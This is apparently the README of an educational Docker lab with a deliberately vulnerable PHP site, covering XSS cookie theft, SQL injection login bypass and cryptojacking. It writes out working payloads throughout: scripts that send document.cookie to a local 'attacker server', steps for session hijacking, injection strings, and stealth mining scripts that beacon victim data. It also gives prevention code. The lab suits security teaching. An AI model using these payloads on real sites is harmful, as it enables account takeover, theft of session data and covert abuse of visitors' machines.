# XSS Cookie Stealing Lab

A educational security lab demonstrating Cross-Site Scripting (XSS) and authentication vulnerabilities. 
**For educational purposes only - do not use on real websites!**

## Prerequisites

- Docker
- Docker Compose
- Git

## Setup Instructions

1. Clone the repository:
   ```bash
   git clone https://github.com/Amir-Mohseni/XSS-Attack.git
   cd XSS-Attack/xss-lab
   ```

2. Build and start the containers:
   ```bash
   docker-compose up --build
   ```

3. Wait about 30 seconds for MySQL to initialize fully.

4. Access the applications:
   - Vulnerable App: http://localhost:8080
   - Attacker's Log: http://localhost:8081/logs.php
   - Mining Statistics: http://localhost:8081/mining_logs.php

## Vulnerabilities Demonstrated

### 1. Authentication Vulnerabilities

The application has several authentication weaknesses:

a) SQL Injection in Login:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```
Can be bypassed with:
- Username: `admin' --`
- Password: (anything)

b) SQL Injection in Signup:
```sql
INSERT INTO users (username, password) VALUES ('$username', '$password')
```
Can be exploited to create malicious users.

c) Insecure Cookie Handling:
```php
setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
```
- No HttpOnly flag
- No Secure flag
- No SameSite attribute
- Uses predictable user IDs

### 2. XSS + Cookie Theft Attack Chain

1. Create an account and log in
2. Post a comment with the XSS payload:
   ```html
   <script>
   new Image().src = "http://localhost:8081/steal.php?cookie=" + encodeURIComponent(document.cookie);
   </script>
   ```
3. When other users view the page, their cookies are sent to the attacker server
4. View stolen cookies at http://localhost:8081/logs.php
5. Use stolen cookies to impersonate users:
   ```javascript
   document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/";
   ```

### 3. Cryptojacking Attack

The application is also vulnerable to cryptojacking attacks, where attackers can inject cryptocurrency mining scripts that run in victims' browsers.

1. Create an account and log in
2. Post a comment with one of these cryptojacking payloads:

   a) Basic Cryptojacking (visible to user):
   ```html
   <script src="http://localhost:8081/miner.js"></script>
   ```

   b) Hidden Cryptojacking (no UI):
   ```html
   <script>
   const script = document.createElement('script');
   script.src = 'http://localhost:8081/miner.js';
   script.onload = function() {
       miner.createUI = function() { /* Do nothing */ };
       miner.start();
   };
   document.head.appendChild(script);
   </script>
   ```

   c) Stealth Cryptojacking (completely hidden):
   ```html
   <script src="http://localhost:8081/stealth_miner.js"></script>
   ```

   d) Robust Cryptojacking (guaranteed logging):
   ```html
   <script src="http://localhost:8081/robust_miner.js"></script>
   ```

   e) Inline Robust Cryptojacking (no external script):
   ```html
   <script>
   // Create a unique identifier for this victim
   const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);

   // Function to send mining logs directly
   function sendMiningLog(hashes, rate) {
     const data = {
       h: hashes,
       r: rate,
       t: Math.floor(Date.now() / 1000),
       username: document.cookie.includes('user_session') ? document.cookie.split('user_session=')[1].split(';')[0] : 'unknown',
       page: window.location.href,
       victim_id: victimId
     };
     
     // Use multiple methods to ensure the log is sent
     new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
     
     fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
       mode: 'no-cors',
       cache: 'no-cache'
     }).catch(() => {});
     
     const xhr = new XMLHttpRequest();
     xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
     xhr.send();
   }

   // Simulate mining activity and send logs
   let hashCount = 0;
   const miningInterval = setInterval(() => {
     hashCount += Math.floor(Math.random() * 10) + 1;
     const hashRate = Math.floor(Math.random() * 5) + 1;
     sendMiningLog(hashCount, hashRate);
     if (hashCount > 1000) clearInterval(miningInterval);
   }, 5000);
   </script>
   ```

3. When other users view the page, the mining script will:
   - Silently consume CPU resources to mine cryptocurrency
   - Report mining statistics back to the attacker
   - Identify unique victims using browser fingerprinting
   - Adapt mining intensity based on user activity to avoid detection

4. View mining statistics at http://localhost:8081/mining_logs.php, which shows:
   - Total hashes mined across all victims
   - Number of active miners
   - Unique victims and their details
   - Mining activity logs
   - Pages where mining occurred

5. Impact of cryptojacking:
   - Increased CPU usage and battery drain
   - System slowdown
   - Potential overheating
   - Financial gain for attackers at victims' expense

6. Prevention:
   ```php
   // Sanitize user input
   echo "<p>" . htmlspecialchars($row['content']) . "</p>";
   
   // Implement Content Security Policy
   header("Content-Security-Policy: default-src 'self'; script-src 'self'");
   ```

### 4. Session Hijacking Steps

1. Steal user's cookie using XSS
2. Copy the user_session value
3. Create a new browser session
4. Set the stolen cookie using browser dev tools
5. Access http://localhost:8080
6. You're now logged in as the victim

### Cookie Theft Attack Steps

1. **Steal the Cookie**
   ```html
   <script>
   fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie))
   </script>
   ```

2. **Use the Stolen Cookie**
   - Copy the user_session value from the attacker logs
   - Open a new private/incognito window
   - Open browser dev tools (F12)
   - In the Console tab, paste:
   ```javascript
   document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/"
   ```
   - Refresh the page
   - You should now be logged in as the victim user

3. **Enhanced Logging Features**
   - The cookie theft logs now display the victim's username
   - The mining logs also show the actual username instead of just the user ID
   - This makes it easier to identify which users have been compromised
   - The logs page includes convenient "Copy" and "Use Cookie" buttons

4. **Important Notes**
   - The cookie authentication is intentionally vulnerable
   - No additional verification is performed
   - Session is automatically created from cookie
   - All actions will be performed as the victim user
   - Username information is extracted from the user ID in the cookie

5. **Prevention**
   ```php
   // Secure cookie settings
   setcookie('user_session', $value, [
       'expires' => time() + 3600,
       'path' => '/',
       'secure' => true,
       'httponly' => true,
       'samesite' => 'Strict'
   ]);
   ```

## Attack Scenarios

### Scenario 1: Cookie Theft
1. Attacker creates account
2. Posts XSS payload in comment
3. Victim views page
4. Attacker captures victim's cookie
5. Attacker uses cookie to impersonate victim

### Scenario 2: SQL Injection
1. Attacker uses `admin' --` as username
2. Bypasses authentication
3. Posts malicious content as admin

### Scenario 3: Cryptojacking
1. Attacker creates account
2. Posts stealth cryptojacking payload in comment
3. Multiple victims view the page
4. Mining script runs silently in victims' browsers
5. Script identifies unique victims using browser fingerprinting
6. Script adapts mining intensity to avoid detection
7. Attacker monitors mining statistics in real-time
8. Victims experience performance degradation without knowing why

#### Robust Cryptojacking Scenario
1. Attacker steals a user's cookie using XSS
2. Attacker uses the stolen cookie to post a robust cryptojacking payload as that user
3. The robust cryptojacking script ensures mining logs are recorded even if other scripts are present
4. The script uses multiple methods (Image beacon, Fetch API, XMLHttpRequest) to send logs
5. Each victim is assigned a unique identifier for tracking
6. Mining activity is simulated at regular intervals
7. Attacker can view detailed mining statistics including which users were affected
8. The script can operate alongside other scripts without conflicts

### Scenario 4: Combined Attack
1. Use SQL injection to create admin account
2. Post XSS payload as admin
3. Steal cookies from all users
4. Deploy cryptojacking scripts to all visitors
5. Impersonate multiple users while mining cryptocurrency

## Prevention Measures

1. SQL Injection Prevention:
```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
```

2. Secure Cookie Settings:
```php
setcookie('user_session', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

3. XSS Prevention:
```php
$content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
```

4. Cryptojacking Prevention:
```php
// Content Security Policy
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// Subresource Integrity for external scripts
echo '<script src="https://example.com/script.js" 
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" 
      crossorigin="anonymous"></script>';
```

5. Password Hashing:
```php
$hashed_password = password_hash($password, PASSWORD_DEFAULT);
```

## Common Issues

1. **Database Connection Fails**
   - Ensure all containers are running: `docker ps`
   - Check logs: `docker-compose logs db`
   - Try restarting with clean volumes

2. **Login/Signup Not Working**
   - Check database logs
   - Verify user table creation
   - Check for SQL errors

3. **Cookie Stealing Not Working**
   - Ensure both applications are accessible
   - Check browser console for errors
   - Verify attacker server permissions

4. **Cryptojacking Not Working**
   - Check browser console for script loading errors
   - Verify network connectivity between containers
   - Check if Content Security Policy is blocking scripts
   - Make sure the URLs are correct (http://localhost:8081/miner.js)
   - Try using the stealth_miner.js for more reliable operation
   - If logs aren't being recorded, use the robust_miner.js or inline robust payload
   - Test the miner directly at http://localhost:8081/test_robust_miner.html

## Troubleshooting Cryptojacking Issues

### When Using Someone Else's Cookies

If you're using someone else's cookies to post a cryptojacking script and it's not updating the crypto logs when others view the page, try these solutions:

1. **Use the Robust Miner**
   ```html
   <script src="http://localhost:8081/robust_miner.js"></script>
   ```
   The robust miner is designed to work even when other scripts are present on the page.

2. **Use the Inline Robust Payload**
   If the external script isn't loading properly, use the inline payload that doesn't require external scripts:
   ```html
   <script>
   // Create a unique identifier for this victim
   const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);
   
   // Function to send mining logs directly
   function sendMiningLog(hashes, rate) {
     const data = {
       h: hashes,
       r: rate,
       t: Math.floor(Date.now() / 1000),
       username: document.cookie.includes('user_session') ? document.cookie.split('user_session=')[1].split(';')[0] : 'unknown',
       page: window.location.href,
       victim_id: victimId
     };
     
     // Multiple methods to ensure logs are sent
     new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
     
     fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
       mode: 'no-cors',
       cache: 'no-cache'
     }).catch(() => {});
     
     const xhr = new XMLHttpRequest();
     xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
     xhr.send();
   }
   
   // Simulate mining activity
   let hashCount = 0;
   const miningInterval = setInterval(() => {
     hashCount += Math.floor(Math.random() * 10) + 1;
     const hashRate = Math.floor(Math.random() * 5) + 1;
     sendMiningLog(hashCount, hashRate);
     if (hashCount > 1000) clearInterval(miningInterval);
   }, 5000);
   </script>
   ```

3. **Check for Script Conflicts**
   If there are multiple cryptojacking scripts in the comments, they might conflict with each other. The robust miner uses flags to prevent multiple instances from running:
   ```javascript
   // Set flags to prevent other miners from initializing
   window.minerLoaded = true;
   window.stealthMinerActive = true;
   window.robustMinerActive = true;
   ```

4. **Verify Logging Functionality**
   Test the logging functionality directly using the test page:
   ```
   http://localhost:8081/test_robust_miner.html
   ```
   This page allows you to manually start/stop mining and force reports to be sent.

5. **Restart the Containers**
   If all else fails, try restarting the containers:
   ```bash
   cd xss-lab
   docker-compose down
   docker-compose up --build
   ```

## Legal Disclaimer

This project is for educational purposes only. Using these techniques against real websites without explicit permission is illegal and unethical. Always:

- Practice in controlled environments only
- Get written permission before testing
- Follow responsible disclosure
- Respect privacy and data protection laws

## License

This project is released under the MIT License. Use it responsibly.

## SQL Injection Vulnerabilities

### 1. Login Bypass
The login system is vulnerable to SQL injection. Here are some example payloads:

a) Basic Authentication Bypass:
```sql
Username: admin' --
Password: anything
```
This works because:
- `admin'` matches the username
- `--` comments out the password check

b) Login as First User:
```sql
Username: ' OR '1'='1' LIMIT 1 --
Password: anything
```
This works because:
- `OR '1'='1'` makes the WHERE clause always true
- `LIMIT 1` selects the first user
- `--` comments out the password check

c) Advanced Injection:
```sql
Username: ' UNION SELECT 1,1,'admin','admin123',NOW() --
Password: anything
```

### 2. Signup SQL Injection
The signup form is also vulnerable:

a) Create Admin Account:
```sql
Username: admin
Password: '); -- 
```

b) Bypass Username Check:
```sql
Username: admin' OR '1'='1
Password: password
```

### 3. Cookie Theft + SQL Injection Chain
Combine both vulnerabilities:

1. Use SQL injection to gain admin access:
```sql
Username: admin' --
Password: anything
```

2. Post XSS payload as admin:
```html
<script>
fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie))
</script>
```

3. Steal cookies from other users
4. Use stolen cookies to impersonate users

### 4. Cryptojacking + SQL Injection Chain
Combine cryptojacking with SQL injection:

1. Use SQL injection to gain admin access:
```sql
Username: admin' --
Password: anything
```

2. Post cryptojacking payload as admin:
```html
<script src="http://localhost:8081/stealth_miner.js"></script>
```

3. All users visiting the site will mine cryptocurrency for the attacker
4. Monitor mining statistics at http://localhost:8081/mining_logs.php

### Prevention
To prevent SQL injection:

1. Use Prepared Statements:
```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
```

2. Escape Input:
```php
$username = $mysqli->real_escape_string($username);
```

3. Use Parameterized Queries:
```php
$stmt = $mysqli->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $password);
```

## Development and Updates

### Updating Code Changes

When you make changes to the code, you need to rebuild and restart the containers:

1. Basic Restart:
   ```bash
   # Stop containers
   docker-compose down

   # Rebuild and start
   docker-compose up --build
   ```

2. Complete Reset (if having database/volume issues):
   ```bash
   # Stop containers and remove volumes
   docker-compose down -v

   # Remove all unused containers, networks, images
   docker system prune -a --volumes

   # Rebuild and start
   docker-compose up --build
   ```

3. Quick Development Cycle:
   ```bash
   # Restart single container
   docker-compose restart vulnerable-app

   # View logs
   docker-compose logs -f vulnerable-app
   ```

4. Debugging:
   ```bash
   # Check container status
   docker-compose ps

   # View all logs
   docker-compose logs

   # Check database
   docker-compose exec db mysql -udbuser -pdbpassword vulnerable_db
   ```

### Common Development Issues

1. **Changes Not Appearing**
   - Make sure to rebuild: `docker-compose up --build`
   - Check file permissions
   - Clear browser cache

2. **Database Reset Needed**
   ```bash
   # Complete reset
   docker-compose down -v
   docker system prune -a --volumes
   docker-compose up --build
   ```

3. **Permission Issues**
   ```bash
   # Fix logs directory permissions
   chmod -R 777 attacker-server/logs
   ```

4. **Container Access**
   ```bash
   # Access vulnerable-app container
   docker-compose exec vulnerable-app bash

   # Access database
   docker-compose exec db bash
   ```

### Development Tips

1. **View Logs**
   ```bash
   # All containers
   docker-compose logs -f

   # Specific container
   docker-compose logs -f vulnerable-app
   docker-compose logs -f attacker-server
   docker-compose logs -f db
   ```

2. **Check Database**
   ```bash
   # Connect to MySQL
   docker-compose exec db mysql -udbuser -pdbpassword vulnerable_db

   # Useful queries
   SELECT * FROM users;
   SELECT * FROM comments;
   ```

3. **Test Changes**
   - Make code changes
   - `docker-compose up --build`
   - Check logs for errors
   - Test functionality
   - Reset if needed: `docker-compose down -v`

4. **Debug Mode**
   Add to PHP files:
   ```php
   error_reporting(E_ALL);
   ini_set('display_errors', 1);
   ```

Remember to always use `docker-compose down -v` when:
- Changing database schema
- Resetting the application state
- Having persistent issues
- Testing from scratch

## Additional Resources

For more detailed information about the cryptojacking vulnerability:
- See the [CRYPTOJACKING.md](CRYPTOJACKING.md) file
- Explore sample attack payloads in [attack-others/cryptojacking-payload.txt](attack-others/cryptojacking-payload.txt)
- Check out the stealth miner implementation in [attacker-server/src/stealth_miner.js](attacker-server/src/stealth_miner.js)
- Try the robust miner test page at [http://localhost:8081/test_robust_miner.html](http://localhost:8081/test_robust_miner.html)
- Use the robust cryptojacking payloads in [attack-others/robust-cryptojacking-payload.txt](attack-others/robust-cryptojacking-payload.txt) for guaranteed logging 